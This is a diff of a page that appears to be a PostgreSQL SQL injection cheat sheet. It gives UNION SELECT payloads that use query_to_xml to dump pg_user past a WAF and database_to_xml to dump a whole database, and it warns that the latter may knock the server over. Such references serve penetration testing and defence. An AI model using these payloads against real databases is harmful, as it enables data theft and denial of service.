@@ -385,17 +385,14 @@
 table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
 cursor_to_xml(cursor refcursor, count int, nulls boolean, tableforest boolean, targetns text)
 </code></pre>
-
 <p>With <code>query_to_xml</code> you can bypass WAF and exfiltrate the query results in a
 single string:</p>
 <pre><code class="language-sql">... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
 </code></pre>
-
 <h4 id="database_to_xml">database_to_xml</h4>
 <p>The following function may be available and returns the entire current database:</p>
 <pre><code class="language-sql">database_to_xml(nulls boolean, tableforest boolean, targetns text)
 </code></pre>
-
 <p>The exploitation is as follow. Be careful the process may timeout or DOS the
 server:</p>
 <pre><code class="language-sql">... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
